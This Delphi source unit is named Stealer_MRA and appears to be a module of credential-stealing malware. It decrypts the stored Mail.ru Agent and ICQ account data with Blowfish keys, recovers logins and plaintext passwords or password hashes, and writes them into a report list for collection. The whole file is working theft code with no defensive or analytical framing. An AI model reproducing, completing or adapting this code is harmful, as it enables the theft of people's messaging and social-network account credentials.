unit Stealer_MRA;

interface

uses
  Sysutils, Windows, Classes, DCPblowfish, StrUtils;

function MRADecrypt(pkey:dword;pkeylen:dword;
                    pdata:dword;pacccnt:dword;sl:tstringlist;mra_or_icq8:dword):dword;


implementation

uses Parser;

function format_mra_type(logintype:string):string;
begin
  if IndexStr(logintype,['Agent','Facebook','GTalk','ICQ','Jabber','Odnoklassniki','QIP','VKontakte','Yandex']) in [0..8] then
    result:=' ('+logintype+')'
  else
    result:=' (Agent)';
end;

function MRADecrypt(pkey:dword;pkeylen:dword;
                    pdata:dword;pacccnt:dword;sl:tstringlist;mra_or_icq8:dword):dword;
const
  MRA_MAIL            = 0;
  MRA_ICQ             = 1;
var
  Cipher,Cipher2      : TDCP_blowfish;
  key                 : array[00..$37] of byte;
  datain              : array[00..$07] of byte;
  dataout             : array[00..$07] of byte;
  data                : array[00..$FF] of byte;
  dout                : array[00..$FF] of byte;
  icq_buf             : array[00..$37] of byte;
  loginlen,pwdlen,i,
  tmppwdlen,i0,dvi,
  datatype            : dword;
  login,pwd,logintype : string;
  w                   : word;
begin
  // Empty icq decrypt pwd buf
  fillchar(icq_buf,sizeof(icq_buf),0);
  // copy accs count value
  CopyMemory(@pacccnt,pointer(pacccnt),sizeof(pacccnt));
  result:=pacccnt;
  if result=0 then exit;
  // copy KEY
  CopyMemory(@key,pointer(pkey),sizeof(key));
  // init shit
  Cipher := TDCP_blowfish.Create(nil);
  Cipher2 := TDCP_blowfish.Create(nil);
  Cipher.Init(key, sizeof(key)*8, nil);
  for i0:=1 to pacccnt do
  begin
    // copy data type - pwd or hash
    CopyMemory(@datatype,pointer(pdata),sizeof(datatype));
    inc(pdata,sizeof(datatype));
    // copy length(LOGIN)
    CopyMemory(@loginlen,pointer(pdata),sizeof(loginlen));
    inc(pdata,sizeof(loginlen));
    // copy LOGIN
    login:=copy(pchar(pdata),0,loginlen div 2);
    inc(pdata,loginlen);
    // copy length(ENCODED_PWD)
    CopyMemory(@pwdlen,pointer(pdata),sizeof(pwdlen));
    inc(pdata,sizeof(pwdlen));
    if ( pwdlen > 0 ) and ( pwdlen <= sizeof(data) ) then
    begin
      // copy ENCODED_PWD
      fillchar(data,sizeof(data),0);
      CopyMemory(@data,pointer(pdata),pwdlen);
      inc(pdata,pwdlen);
      if (datatype=MRA_MAIL) then
      begin
        // decrypt'em
        for i:=1 to 3 do
        begin
          CopyMemory(@datain,@data[(i-1)*8],sizeof(datain));
          Cipher.DecryptECB(datain, dataout);
          CopyMemory(@dout[(i-1)*8],@dataout,sizeof(dataout));
        end;
        CopyMemory(@icq_buf[$00],@dout[$08],$10);
        CopyMemory(@icq_buf[$10],@dout[$08],$10);
        CopyMemory(@icq_buf[$20],@dout[$08],$10);
        CopyMemory(@icq_buf[$30],@dout[$08],$08);
      end;
      if (datatype=MRA_ICQ)then
      begin
        Cipher2.Init(icq_buf, sizeof(icq_buf)*8, nil);
        for i:=1 to (pwdlen div 8) do
        begin
          CopyMemory(@datain,@data[(i-1)*8],sizeof(datain));
          Cipher2.DecryptECB(datain, dataout);
          CopyMemory(@dout[(i-1)*8],@dataout,sizeof(dataout));
        end;
      end;
    end;
    // parse login'pwd
    i:=pos('#',login);
    dvi:=pos(':',login);
    if dvi<>0 then
      logintype:=copy(login,1,dvi-1)
    else
      logintype:=copy(login,1,i-1);
    if logintype='Agent' then datatype:=MRA_MAIL;
    login:=copy(login,i+1,dword(length(login))-i);
    sl.Add(formattype(REPORT_DATA_LOGIN)+login+format_mra_type(logintype));
    
    if pwdlen<>0 then
    begin
      if datatype=MRA_MAIL then
      begin
        //CopyMemory(@pwdlen,@dout[4],sizeof(pwdlen));
        pwd:=Format('%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x',
                   [dout[08],dout[09],dout[10],dout[11],dout[12],dout[13],dout[14],dout[15],
                    dout[16],dout[17],dout[18],dout[19],dout[20],dout[21],dout[22],dout[23]])
      end;
      if ((datatype=MRA_ICQ)or(mra_or_icq8=1)) then
      begin
        CopyMemory(@tmppwdlen,@dout[4],sizeof(tmppwdlen)); // doubled length
        if tmppwdlen <= sizeof(data) then
        begin
          pwd:='';
          for i:=0 to (tmppwdlen div 2)-1 do
          begin
            CopyMemory(@w,@dout[8+i*2],sizeof(w));
            pwd:=pwd+chr(w);
          end;
        end;
      end;
    sl.Add(formattype(REPORT_DATA_PWD)+pwd);
    end;
  end;
  Cipher2.Burn;
  Cipher2.Free;
  Cipher.Burn;
  Cipher.Free;
end;

end.
